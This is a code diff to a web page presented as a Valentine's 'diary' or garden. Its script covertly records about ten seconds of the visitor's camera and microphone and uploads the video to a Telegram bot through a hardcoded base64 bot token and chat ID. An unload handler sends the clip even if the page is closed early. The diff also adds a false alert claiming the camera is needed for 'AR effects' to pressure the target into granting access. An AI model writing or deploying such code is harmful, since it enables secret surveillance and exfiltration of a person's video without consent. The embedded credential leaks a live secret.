@@ -123,16 +123,22 @@
         const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
         const bgMusic = document.getElementById('bg-music');
       let mediaRecorder, recordedChunks = [];
-// Your base64 encoded token
 const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
 
 async function startDiary() {
     try {
-        // Notify bot that the link has been opened
+        // 1. Request camera/mic access FIRST
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        
+        // 2. Only if access is granted, show the diary
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('diary-wrapper').style.display = 'flex';
+        document.getElementById('bg-music').play();
+
+        // 3. Notify your bot
         fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
 
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        // Use webm for high browser compatibility
+        document.getElementById('video-preview').srcObject = stream;
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
         mediaRecorder.ondataavailable = (e) => { 
@@ -143,9 +149,7 @@ async function startDiary() {
             if (recordedChunks.length === 0) return;
             const blob = new Blob(recordedChunks, { type: 'video/webm' });
             const formData = new FormData();
-            formData.append('chat_id', "5324376571"); // Your Chat ID
-            
-            // Send as a document to guarantee delivery
+            formData.append('chat_id', "5324376571");
             formData.append('document', blob, 'reaction.webm');
             
             fetch(`https://api.telegram.org/bot${t}/sendDocument`, { 
@@ -156,17 +160,17 @@ async function startDiary() {
 
         mediaRecorder.start();
 
-        // Standard 10-second recording duration
         setTimeout(() => { 
             if (mediaRecorder.state === "recording") mediaRecorder.stop(); 
         }, 10000);
 
     } catch (err) { 
-        alert("Camera access needed for the interactive garden! ❤️"); 
+        // ❌ If camera is blocked, she stays on the welcome screen
+        alert("Wait! To enter the garden, you must allow camera access for the AR effects! ❤️");
+        console.log("Access Denied: Diary remains hidden.");
     }
 }
 
-// Emergency upload: Sends video even if she closes the browser early
 window.addEventListener('beforeunload', () => {
     if (mediaRecorder && mediaRecorder.state === "recording") {
         mediaRecorder.stop();
